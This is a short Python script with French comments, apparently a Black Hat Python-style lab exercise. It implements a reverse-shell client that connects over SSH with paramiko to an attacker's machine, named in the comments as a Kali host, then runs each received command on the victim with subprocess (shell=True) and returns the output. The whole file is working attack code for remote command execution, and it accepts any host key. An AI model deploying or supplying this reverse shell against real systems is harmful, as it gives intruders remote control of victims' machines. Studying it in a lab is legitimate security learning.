import paramiko
import shlex
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # On accepte toutes les clés (mode bourrin)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(ip, port=2222, username=user, password=passwd)
        
        # On ouvre une session SSH brute
        ssh_session = client.get_transport().open_session()
        
        if ssh_session.active:
            # On signale au serveur qu'on est prêt
            ssh_session.send(command)
            
            # On affiche la bannière de bienvenue du serveur
            print(ssh_session.recv(1024).decode())
            
            while True:
                # 1. On attend l'ordre du Maître (Attaquant)
                command = ssh_session.recv(1024)
                
                try:
                    cmd = command.decode()
                    if cmd == 'exit':
                        client.close()
                        break
                    
                    # 2. On exécute la commande sur la machine locale (Victime)
                    cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                    
                    # 3. On renvoie le résultat au Maître
                    ssh_session.send(cmd_output or 'ok')
                    
                except Exception as e:
                    ssh_session.send(str(e))
        client.close()
    except Exception as e:
        print(f"[-] Connection Failed: {e}")
        
if __name__ == '__main__':
    # Ici, met l'IP de TA machine Kali (l'attaquant)
    # user/pass doivent correspondre à ceux définis dans le serveur
    import getpass
    # user = getpass.getuser()
    user = 'achraf' 
    password = 'BHP'
    
    # "ClientConnected" est le signal que le serveur attend pour démarrer la boucle
    ssh_command('127.0.0.1', user, password, 'ClientConnected')
